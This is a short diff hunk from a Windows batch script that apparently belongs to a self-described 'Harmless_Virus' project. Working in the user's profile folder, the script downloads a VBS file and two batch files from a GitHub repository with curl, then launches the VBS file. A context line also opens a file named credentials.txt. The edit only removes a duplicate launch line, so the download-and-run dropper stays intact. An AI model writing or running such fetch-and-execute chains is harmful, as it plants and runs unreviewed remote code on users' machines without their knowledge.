@@ -7,7 +7,6 @@ start credentials.txt
 cd %USERPROFILE%/
 
 curl -o save.vbs "https://raw.githubusercontent.com/Arnost55/Harmless_Virus/main/save.vbs"
-start save.vbs
 curl -o 2.bat "https://raw.githubusercontent.com/Arnost55/Harmless_Virus/main/2.bat"
 curl -o 3.bat "https://raw.githubusercontent.com/Arnost55/Harmless_Virus/main/3.bat"
 start save.vbs
